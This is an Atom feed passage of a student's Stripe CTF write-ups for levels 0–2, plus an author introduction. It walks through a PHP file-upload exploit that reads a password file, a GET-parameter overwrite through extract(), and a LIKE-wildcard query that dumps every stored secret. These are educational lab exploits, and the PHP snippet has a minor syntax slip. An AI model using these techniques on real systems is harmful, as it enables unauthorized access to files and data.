&lt;p&gt;You also know where your &amp;quot;picture&amp;quot; is stored: uploads/your_file. So we
can upload a PHP script that'll open the password file, and visit the
URL where it's located to execute it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class="nv"&gt;$content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;file_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;../password.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$content&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's name this file exploit.php. We upload it:&lt;/p&gt;
&lt;img alt="level02-uploaded-script.png" class="align-center" src="/images/stripe-ctf-level-2/level02-uploaded-script.png" /&gt;
&lt;p&gt;We can see that no image is displayed (because your browser can't
display the script as an image), yet the server says it was successfully
uploaded. Now, we just have to go to upoads/exploit.php, and &lt;strong&gt;bam!&lt;/strong&gt;
you have the password for this level.&lt;/p&gt;
&lt;img alt="level02-executing-script.png" class="align-center" src="/images/stripe-ctf-level-2/level02-executing-script.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #1</title><link href="https://allyourbase.utouch.fr/posts/2012/10/13/stripe-ctf-level-1/" rel="alternate"></link><updated>2012-10-13T15:52:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:posts/2012/10/13/stripe-ctf-level-1/</id><summary type="html">&lt;img alt="level01-logo.jpg" class="align-center" src="/images/stripe-ctf-level-1/level01-logo.jpg" /&gt;
&lt;p&gt;You can find the code of this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-1/level01-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;b67c313a1a3bebd8702159efae32f95f1b41885f6e00103ee53e896a53194f43&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;So, this level wants you to guess a password, stored in a file named
&amp;quot;secret-combination.txt&amp;quot; on the server. If you manage to do it, it'll
give you the password for this level. Let's take a look at the code and
see how to get the password without knowing the combination.&lt;/p&gt;
&lt;p&gt;The server starts by defining a variable &lt;code&gt;$filename&lt;/code&gt; equal
to &amp;quot;secret-combination.txt&amp;quot;. That's the file of the combination (I'm so
deductive). It then retrieves your attempt (which was passed by &lt;code&gt;GET&lt;/code&gt;),
and compares it to the content of the file. If they're the same, the
server will gives you the sweet, sweet password. Otherwise, tough.&lt;/p&gt;
&lt;img alt="level01-failed-attempt.png" class="align-center" src="/images/stripe-ctf-level-1/level01-failed-attempt.png" /&gt;
&lt;p&gt;The thing is, the server doesn't retrieve your attempt using
&lt;code&gt;$_GET['attempt']&lt;/code&gt;. It uses the &lt;a class="reference external" href="http://php.net/manual/en/function.extract.php"&gt;extract PHP
function&lt;/a&gt; on the
&lt;code&gt;$_GET&lt;/code&gt; array. Basically, for every entry &lt;code&gt;$_GET['key'] = value&lt;/code&gt;,
itâ€™ll create a variable &lt;code&gt;$key&lt;/code&gt; with the value
&lt;code&gt;value&lt;/code&gt;. It means that if we give a parameter filename in the
&lt;code&gt;GET&lt;/code&gt; request, we can override the variable &lt;code&gt;$filename&lt;/code&gt;, and open
any file. So let's open a non-existing file, and give an empty guess:
&lt;code&gt;?attempt=&amp;amp;filename=dummy-filename.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This request will set &lt;code&gt;$filename&lt;/code&gt; to &amp;quot;dummy-filename.txt&amp;quot;, so
that when the server tries to retrieve its content, it'll yield an empty
string. Since our attempt is empty, it will match, and the server will
give us the password for this level.&lt;/p&gt;
&lt;img alt="level01-success-attempt.png" class="align-center" src="/images/stripe-ctf-level-1/level01-success-attempt.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>Stripe CTF: Level #0</title><link href="https://allyourbase.utouch.fr/posts/2012/10/13/stripe-ctf-level-0/" rel="alternate"></link><updated>2012-10-13T15:41:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:posts/2012/10/13/stripe-ctf-level-0/</id><summary type="html">&lt;img alt="level00-logo.png" class="align-center" src="/images/stripe-ctf-level-0/level00-logo.png" /&gt;
&lt;p&gt;You can find the code of this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-0/level00-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;da9712a1851597d6d4b5a90224a1d0fcaa4b558f55a10ca0c7a115d18fe9dcb7&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;So, this level is a safe that keeps your secrets for you. But it also
keeps secrets for other people. Let's find out how we can recover the
password for this level.&lt;/p&gt;
&lt;p&gt;The page is a simple form with three fields: your key, your secret
and the name of your secret. When you post these values, they are
registered in a database in this format: (key.secret_name, secret).&lt;/p&gt;
&lt;p&gt;The safe gives you the possibility to retrieve your secrets by entering
your key (otherwise, it'd be a stupid safe). Then, it'll do a SQL query
to get every entry which looks like this: (entered_key.anything,
anything). The SQL query is this one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;secrets&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;key&lt;/span&gt; &lt;span class="k"&gt;LIKE&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;.%&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It's a prepared query, used to prevent SQL injection (with quotes and
the like). The ? will be replaced by the value you send to the server.
The &lt;code&gt;LIKE&lt;/code&gt; keyword is used to match a string against a regexp.
The % means &amp;quot;any number of any characters&amp;quot; (kind of like the *).&lt;/p&gt;
&lt;p&gt;The problem with this is that the key you enter is not sanitized. Well,
it's sanitized by the prepared query so that you cannot perform SQL.
But it's not sanitized for the &lt;code&gt;LIKE&lt;/code&gt; syntax. So
let's say you enter % as a key, the query will look like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;secrets&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;key&lt;/span&gt; &lt;span class="k"&gt;LIKE&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It means &amp;quot;select every secret where the key has the form
'any_characters.any_characters'&amp;quot;. And that's every secret! So the safe
will give you every secret stored, and thus, the password for this
level.&lt;/p&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</summary></entry><entry><title>#define AUTHOR Yannick MÃ©heut</title><link href="https://allyourbase.utouch.fr/posts/2012/10/13/define-author-yannick-meheut/" rel="alternate"></link><updated>2012-10-13T03:09:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:posts/2012/10/13/define-author-yannick-meheut/</id><summary type="html">&lt;p&gt;Hi everyone!&lt;/p&gt;
&lt;p&gt;My name is Yannick, I'm a 22 year-old student at the French engineer
school TÃ©lÃ©com ParisTech. I study cryptography and info/netsec. Although
I find these topics fascinating, I'm pretty new to this world.&lt;/p&gt;
&lt;img alt="yannick.jpg" class="align-center" src="/images/define-author-yannick-meheut/yannick.jpg" /&gt;
&lt;p&gt;Last month, I decided to participate to the Stripe CTF, and,
unexpectedly, I managed to capture the flag, yay! I chose to create a
blog to post my write-ups, to leave a trace of my participation, and
later post news from the info/netsec world.&lt;/p&gt;
&lt;p&gt;Hope you have a nice time,&lt;/p&gt;
&lt;p&gt;Cheers.&lt;/p&gt;
</summary></entry></feed>